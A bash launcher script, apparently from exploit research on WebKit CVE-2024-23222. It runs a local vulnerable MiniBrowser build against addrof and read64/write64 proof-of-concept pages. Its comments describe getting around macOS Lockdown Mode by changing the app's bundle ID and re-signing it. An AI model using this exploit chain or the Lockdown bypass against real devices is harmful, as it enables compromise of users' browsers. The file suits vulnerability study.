#!/bin/bash
# Launch the vulnerable MiniBrowser against cve-2024-23222.html.
#
# WHY THIS SCRIPT EXISTS (and why run-minibrowser --release was failing):
#
#   1. macOS Lockdown Mode is on system-wide (defaults read -g LDMGlobalEnabled
#      => 1). WebProcessPoolCocoa.mm:975 explicitly whitelists bundle ID
#      "org.webkit.MiniBrowser" to honor it, so WebContent spawned as
#      com.apple.WebKit.WebContent.CaptivePortal which has NO JIT. No JIT,
#      no FTL, no tryGetConstantProperty on the compiler thread, no race.
#      Fix: MiniBrowser.app/Contents/Info.plist now has CFBundleIdentifier
#      = org.webkit.MiniBrowserNoLockdown (re-signed adhoc). The lockdown
#      check falls through to "return false" for unrecognised bundle IDs.
#
#   2. MiniBrowser ignores positional URL args. Needs --url <url>.
#
#   3. The dev-build XPC bootstrap forwards WebContent stdout/stderr back
#      to the UI process (ProcessLauncherCocoa.mm:195). JS console.log
#      lands on this process's stderr.
#
# Usage:
#   ./run-minibrowser-poc.sh                    # addrof-only harness (legacy)
#   ./run-minibrowser-poc.sh -rw                # full read64/write64 chain, pivot=175000
#   ./run-minibrowser-poc.sh -rw 'pivot=178000' # full chain, override pivot
#   ./run-minibrowser-poc.sh -rw 'pivot=175000&max=10'  # 10 retries
#
# The -rw harness uses Workers (one per attempt) instead of page reloads.
# Worker context has no DOM/event-loop overhead so PIVOT tracks the jsc
# shell more closely than the main-thread addrof harness does. Reliable band
# for the rw worker source is 173K-182K; default 175K is near center.

set -e
ROOT=$(cd "$(dirname "$0")/.." && pwd)
# Locate the build dir containing MiniBrowser.app. The writeup's instructions
# produce WebKitBuild/Release, but local dev builds may use suffixed dirs.
if [[ -n "${FW:-}" ]]; then
    : # caller override
else
    for d in "$ROOT"/jsc-vuln/WebKit/WebKitBuild/Release \
             "$ROOT"/jsc-vuln/WebKit/WebKitBuild/Release-*; do
        [[ -d "$d/MiniBrowser.app" ]] && { FW="$d"; break; }
    done
fi
[[ -d "${FW:-}/MiniBrowser.app" ]] || {
    echo "ERROR: MiniBrowser.app not found under any WebKitBuild/Release* dir." >&2
    echo "  Set FW=/path/to/WebKitBuild/Release and retry." >&2
    exit 1
}
echo ">> using FW=$FW" >&2

# -rw selects the full-chain harness. Backward compat: no flag = addrof-only.
if [[ "${1:-}" == "-rw" ]]; then
    POC="$ROOT/poc/cve-2024-23222-rw-browser.html"
    shift
    DEFAULT_QS="max=30"
else
    POC="$ROOT/poc/cve-2024-23222.html"
    DEFAULT_QS="max=1"
fi

# Sanity: lockdown bypass in place?
BID=$(/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" "$FW/MiniBrowser.app/Contents/Info.plist")
if [[ "$BID" == "org.webkit.MiniBrowser" ]]; then
    echo "ERROR: bundle ID is still org.webkit.MiniBrowser; lockdown bypass not applied." >&2
    echo "  Run: /usr/libexec/PlistBuddy -c 'Set :CFBundleIdentifier org.webkit.MiniBrowserNoLockdown' '$FW/MiniBrowser.app/Contents/Info.plist'" >&2
    echo "       codesign -f -s - '$FW/MiniBrowser.app'" >&2
    exit 1
fi

QS="${1:-$DEFAULT_QS}"
URL="file://$POC?$QS"
echo ">> $URL" >&2

# __XPC_* env vars propagate into the WebContent XPC service so the child
# process loads our build's frameworks instead of the system ones.
exec env \
    DYLD_FRAMEWORK_PATH="$FW" \
    DYLD_LIBRARY_PATH="$FW" \
    __XPC_DYLD_FRAMEWORK_PATH="$FW" \
    __XPC_DYLD_LIBRARY_PATH="$FW" \
    "$FW/MiniBrowser.app/Contents/MacOS/MiniBrowser" --url "$URL"
